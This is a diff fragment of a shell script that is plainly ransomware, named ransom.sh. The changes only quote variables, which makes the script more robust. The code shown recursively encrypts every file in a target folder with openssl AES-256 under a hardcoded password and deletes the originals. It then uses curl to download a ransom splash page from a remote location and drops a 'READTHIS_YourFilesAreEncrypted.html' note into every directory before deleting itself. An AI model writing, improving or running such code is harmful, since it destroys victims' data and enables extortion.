@@ -23,12 +23,12 @@ then
 		find -L "$file" -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
 	done
 else
-	find -L $targetFolder -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
+	find -L "$targetFolder" -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;
 fi
 
 
 #	Warn user their files are encrypted
-curl $splashLocation -s > /tmp/READTHIS_YourFilesAreEncrypted.html
-find -L $targetFolder -type d -exec cp /tmp/READTHIS_YourFilesAreEncrypted.html '{}' \;
+curl "$splashLocation" -s > /tmp/READTHIS_YourFilesAreEncrypted.html
+find -L "$targetFolder" -type d -exec cp /tmp/READTHIS_YourFilesAreEncrypted.html '{}' \;
 
 rm /tmp/ransom.sh
